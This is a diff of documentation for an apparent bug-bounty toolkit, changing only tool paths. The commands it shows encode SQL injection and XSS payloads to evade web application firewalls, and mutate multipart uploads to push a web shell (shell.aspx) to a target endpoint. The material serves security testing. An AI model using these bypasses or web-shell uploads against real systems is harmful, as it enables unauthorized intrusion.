@@ -40,10 +40,10 @@ Fingerprint saved to `findings/bypass/<ts>/waf_fingerprint.txt`.
 For payload-level bypass (SQLi/XSS keyword blocked by WAF):
 
 ```bash
-tools/waf_encoder.py "' OR 1=1--" --class sqli
-tools/waf_encoder.py "<script>alert(1)</script>" --class xss
-tools/waf_encoder.py "<payload>" --layers 3   # triple URL-encode
-tools/waf_encoder.py "<payload>" --json       # machine-readable output
+bughunter/tools/waf_encoder.py "' OR 1=1--" --class sqli
+bughunter/tools/waf_encoder.py "<script>alert(1)</script>" --class xss
+bughunter/tools/waf_encoder.py "<payload>" --layers 3   # triple URL-encode
+bughunter/tools/waf_encoder.py "<payload>" --json       # machine-readable output
 ```
 
 Generates 20-40 variants: URL encoding (1-3 layers), unicode escape, HTML entity, SQL comment injection, MySQL version comment, case mixing, operator substitution, base64 XSS wrappers, null byte insertion.
@@ -53,8 +53,8 @@ Generates 20-40 variants: URL encoding (1-3 layers), unicode escape, HTML entity
 For blocked file upload endpoints:
 
 ```bash
-tools/multipart_mutator.py --file shell.aspx --field file
-tools/multipart_mutator.py --file shell.aspx --field file \
+bughunter/tools/multipart_mutator.py --file shell.aspx --field file
+bughunter/tools/multipart_mutator.py --file shell.aspx --field file \
   --url https://target/upload --send
 ```
 
@@ -85,8 +85,8 @@ triage can look up the exact WAF rule that fired.
 
 For more sophisticated analysis (baseline calibration + weighted score engine + log ID extraction):
 ```bash
-tools/waf_response_analyzer.py --calibrate https://target.com --output /tmp/baseline.json
-tools/waf_response_analyzer.py --classify --status 200 --body /tmp/resp.html \
+bughunter/tools/waf_response_analyzer.py --calibrate https://target.com --output /tmp/baseline.json
+bughunter/tools/waf_response_analyzer.py --classify --status 200 --body /tmp/resp.html \
   --headers /tmp/resp.hdr --baseline /tmp/baseline.json --metrics "200|2048|0.05" --format json
 ```
 
